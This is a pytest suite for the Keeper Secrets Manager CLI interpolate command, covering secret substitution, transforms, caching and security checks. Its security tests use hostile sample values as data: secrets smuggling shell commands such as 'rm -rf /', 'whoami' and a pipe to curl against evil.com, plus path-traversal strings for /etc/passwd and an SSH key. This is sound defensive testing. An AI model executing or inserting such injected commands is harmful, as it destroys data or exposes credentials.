# -*- coding: utf-8 -*-
"""Simplified working tests for KSM interpolate command - All mocks fixed for offline testing"""

import os
import sys
import tempfile
import pytest
from pathlib import Path
from unittest.mock import Mock, MagicMock, patch

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from keeper_secrets_manager_cli.interpolate import Interpolate
from keeper_secrets_manager_cli.exception import KsmCliException


def create_mock_cli():
    """Create a properly mocked CLI instance"""
    mock_cli = Mock()
    mock_cli.client = Mock()
    mock_cli.use_color = False
    return mock_cli


class TestSecurityCritical:
    """Critical security tests - must all pass!"""

    def test_shell_injection_newlines_blocked(self):
        """Test Michael Jumper's finding - newlines in secrets blocked by default"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = False

        malicious_value = "password123\nrm -rf /"

        with pytest.raises(KsmCliException) as exc_info:
            interpolate._check_shell_injection_risk(malicious_value, "keeper://TEST/field/password")

        assert "SECURITY ERROR" in str(exc_info.value)
        assert "newline" in str(exc_info.value)

    def test_shell_injection_command_substitution_blocked(self):
        """Test all shell metacharacters are blocked"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = False

        dangerous_values = [
            "password$(whoami)",
            "password`whoami`",
            "password;rm -rf /",
            "password|curl evil.com",
            "password&background",
        ]

        for malicious_value in dangerous_values:
            with pytest.raises(KsmCliException) as exc_info:
                interpolate._check_shell_injection_risk(malicious_value, "keeper://TEST/field/password")
            assert "SECURITY ERROR" in str(exc_info.value)

    def test_shell_injection_with_flag_allows_with_warning(self):
        """Test --allow-unsafe-for-eval flag allows with warning"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        malicious_value = "password\nrm -rf /"
        interpolate._check_shell_injection_risk(malicious_value, "keeper://TEST/field/password")

        assert len(interpolate.warnings) > 0
        assert "dangerous shell characters" in interpolate.warnings[0]

    def test_default_values_checked_for_injection(self):
        """Test that default values are also checked for shell injection"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(side_effect=Exception("Not found"))

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = False

        # Default value with semicolon (shell metacharacter) should be blocked
        content = "PASSWORD=keeper://MISSING/field/password:-safe;rm -rf /\n"

        with pytest.raises(KsmCliException) as exc_info:
            interpolate._process_content(content, False, False)

        assert "SECURITY ERROR" in str(exc_info.value)

    def test_symlink_rejection(self):
        """Test symlinks are rejected"""
        with tempfile.TemporaryDirectory() as tmpdir:
            real_file = Path(tmpdir) / "real.txt"
            real_file.write_text("test")

            symlink_file = Path(tmpdir) / "symlink.txt"
            symlink_file.symlink_to(real_file)

            mock_cli = create_mock_cli()
            interpolate = Interpolate(mock_cli)

            with pytest.raises(KsmCliException) as exc_info:
                interpolate._validate_path(str(symlink_file))

            assert "Symlinks not allowed" in str(exc_info.value)

    def test_redos_prevention(self):
        """Test ReDoS protection with bounded regex"""
        import time
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)

        # Malicious template
        malicious_template = "{{" + "{{" * 100 + "exec" + "}}" * 100

        start_time = time.time()
        try:
            interpolate._validate_template(malicious_template)
        except KsmCliException:
            pass

        elapsed = time.time() - start_time
        assert elapsed < 1.0, f"ReDoS detected: took {elapsed} seconds"

    def test_path_traversal_blocked(self):
        """Test path traversal attacks are blocked"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)

        dangerous_paths = [
            "../../../etc/passwd",  # Path traversal with ..
            "~/ssh/id_rsa",         # Home directory reference
            "./../../file.txt",     # Relative traversal
        ]

        for path in dangerous_paths:
            with pytest.raises(KsmCliException):
                interpolate._validate_path(path)


class TestNewFeatures:
    """Test new features: defaults, transforms, comments"""

    def test_default_values(self):
        """Test default values when secret not found"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(side_effect=Exception("Not found"))

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "DB_HOST=keeper://MISSING/field/host:-localhost\n"
        result = interpolate._process_content(content, False, False)

        assert "DB_HOST=localhost" in result
        assert len(interpolate.used_defaults) == 1

    def test_transformation_base64(self):
        """Test base64 transformation"""
        import base64
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="my_secret_key")

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "KEY=keeper://API/field/key|base64\n"
        result = interpolate._process_content(content, False, False)

        expected = base64.b64encode(b"my_secret_key").decode()
        assert f"KEY={expected}" in result

    def test_transformation_urlencode(self):
        """Test URL encoding"""
        import urllib.parse
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="my password with spaces")

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "URL=keeper://Config/field/url|urlencode\n"
        result = interpolate._process_content(content, False, False)

        assert "my%20password%20with%20spaces" in result

    def test_invalid_transform_rejected(self):
        """Test invalid transform names are rejected"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="value")

        interpolate = Interpolate(mock_cli)

        content = "KEY=keeper://API/field/key|invalid_transform\n"

        with pytest.raises(KsmCliException) as exc_info:
            interpolate._process_content(content, False, False)

        assert "Unknown transform" in str(exc_info.value)
        assert "Available transforms" in str(exc_info.value)

    def test_comment_preservation(self):
        """Test comments are not processed"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="secret123")

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = """# Comment with keeper://FAKE/field/password preserved
DB_PASSWORD=keeper://DB/field/password
  # Indented comment keeper://ANOTHER/field/key
"""

        result = interpolate._process_content(content, False, False)

        # Comments unchanged
        assert "# Comment with keeper://FAKE/field/password preserved" in result
        assert "  # Indented comment keeper://ANOTHER/field/key" in result

        # Only non-comment notations replaced
        assert "DB_PASSWORD=secret123" in result
        assert interpolate.replacements_count == 1

    def test_multiple_notations_same_line(self):
        """Test multiple notations on same line"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(side_effect=["user123", "pass456"])

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "CONNECTION=postgresql://keeper://DB/field/login:keeper://DB/field/password@localhost/db\n"
        result = interpolate._process_content(content, False, False)

        assert "postgresql://user123:pass456@localhost/db" in result
        assert interpolate.replacements_count == 2

    def test_default_with_transformation(self):
        """Test default value with transformation"""
        import base64
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(side_effect=Exception("Not found"))

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "ENCODED=keeper://MISSING/field/key:-default_value|base64\n"
        result = interpolate._process_content(content, False, False)

        expected = base64.b64encode(b"default_value").decode()
        assert f"ENCODED={expected}" in result


class TestCore:
    """Test core functionality"""

    def test_basic_replacement(self):
        """Test basic secret replacement"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="secret123")

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        content = "PASSWORD=keeper://RECORD/field/password\n"
        result = interpolate._process_content(content, False, False)

        assert "PASSWORD=secret123" in result
        assert interpolate.replacements_count == 1

    def test_caching(self):
        """Test caching prevents duplicate API calls"""
        mock_cli = create_mock_cli()
        mock_cli.client.get_notation = Mock(return_value="cached_value")

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = True

        # Same notation used 3 times
        content = """KEY1=keeper://DB/field/password
KEY2=keeper://DB/field/password
KEY3=keeper://DB/field/password
"""
        result = interpolate._process_content(content, False, False)

        # Should only call get_notation ONCE (cached)
        assert mock_cli.client.get_notation.call_count == 1
        assert interpolate.replacements_count == 3

    def test_empty_file(self):
        """Test empty file handling"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)

        content = ""
        result = interpolate._process_content(content, False, False)

        assert result == content
        assert interpolate.replacements_count == 0

    def test_file_with_only_comments(self):
        """Test file with only comments"""
        mock_cli = create_mock_cli()
        interpolate = Interpolate(mock_cli)

        content = "# Comment 1\n# Comment with keeper://FAKE/field/password\n"
        result = interpolate._process_content(content, False, False)

        assert result == content
        assert interpolate.replacements_count == 0

    def test_notation_pattern(self):
        """Test notation pattern matches correctly"""
        patterns_should_match = [
            "keeper://UID123/field/password",
            "keeper://UID-dash/custom_field/API Key",
            "keeper://ABC/field/name:default",
            "keeper://ABC/field/name|base64",
            "keeper://ABC/field/name:default|base64",
        ]

        for notation in patterns_should_match:
            matches = Interpolate.KEEPER_NOTATION_PATTERN.findall(notation)
            assert len(matches) > 0, f"Should match: {notation}"


class TestBugFixes:
    """Tests for specific bug fixes - regression tests"""

    def test_security_error_not_misclassified_as_access_denied(self):
        """
        Regression test for bug where security errors were misclassified as 'Access denied'

        Issue: When a password contains shell metacharacters, the SECURITY ERROR message
        contains the word "access" (in "Keeper write access"), causing it to be
        misclassified as an access/permission error.

        Fix: Check for "security error" keyword BEFORE checking for "access" keyword.
        """
        mock_cli = create_mock_cli()

        # Test the exact scenario from the bug report
        def mock_get_notation(notation):
            if "field/login" in notation:
                return "user@example.com"
            elif "field/password" in notation:
                # Password with backtick and dollar sign (from original bug report)
                return "dD%qj{]BA`Yzap$6z(h,"
            raise Exception("Not found")

        mock_cli.client.get_notation = Mock(side_effect=mock_get_notation)

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = False

        content = """DB_USER=keeper://TEST/field/login
DB_PASSWORD=keeper://TEST/field/password
"""

        # Process the content
        result = interpolate._process_content(content, False, False)

        # Should have exactly 1 error (for the password field)
        assert len(interpolate.errors) == 1, f"Expected 1 error, got {len(interpolate.errors)}"

        error_msg = interpolate.errors[0]

        # The error should contain "SECURITY ERROR" not "Access denied"
        assert "SECURITY ERROR" in error_msg, \
            f"Error should contain 'SECURITY ERROR' but got: {error_msg[:100]}"

        # Should NOT be misclassified as access denied
        assert "Access denied" not in error_msg, \
            f"Error should NOT say 'Access denied' but got: {error_msg[:100]}"

        # Should mention the dangerous characters
        assert "shell metacharacters" in error_msg or "backtick" in error_msg or "dollar" in error_msg, \
            f"Error should mention dangerous characters but got: {error_msg[:100]}"

    def test_all_dangerous_chars_show_security_error(self):
        """Test that all 9 dangerous shell metacharacters show proper security errors"""
        dangerous_chars = ['\n', '\r', '`', '$', ';', '|', '&', '>', '<']

        for char in dangerous_chars:
            mock_cli = create_mock_cli()
            password_with_char = f"password{char}test"

            def mock_get_notation(notation):
                return password_with_char

            mock_cli.client.get_notation = Mock(side_effect=mock_get_notation)

            interpolate = Interpolate(mock_cli)
            interpolate.allow_unsafe_for_eval = False

            content = "PASSWORD=keeper://TEST/field/password\n"
            result = interpolate._process_content(content, False, False)

            # Should have an error
            assert len(interpolate.errors) == 1, \
                f"Char {repr(char)}: Expected 1 error, got {len(interpolate.errors)}"

            error_msg = interpolate.errors[0]

            # Should be a security error, not access denied
            assert "SECURITY ERROR" in error_msg or "shell" in error_msg.lower(), \
                f"Char {repr(char)}: Should show security error but got: {error_msg[:80]}"

            assert "Access denied" not in error_msg, \
                f"Char {repr(char)}: Should NOT be 'Access denied' but got: {error_msg[:80]}"

    def test_real_access_denied_still_works(self):
        """Ensure legitimate access denied errors still show correctly"""
        mock_cli = create_mock_cli()

        # Simulate a real access/permission error (no shell chars in message)
        def mock_get_notation(notation):
            raise Exception("Permission denied: User does not have access to this record")

        mock_cli.client.get_notation = Mock(side_effect=mock_get_notation)

        interpolate = Interpolate(mock_cli)
        interpolate.allow_unsafe_for_eval = False

        content = "PASSWORD=keeper://TEST/field/password\n"
        result = interpolate._process_content(content, False, False)

        # Should have an error
        assert len(interpolate.errors) == 1

        error_msg = interpolate.errors[0]

        # Should still be classified as access denied (no "SECURITY ERROR" in original exception)
        assert "Access denied" in error_msg or "permission" in error_msg.lower(), \
            f"Real permission errors should still show 'Access denied' but got: {error_msg}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
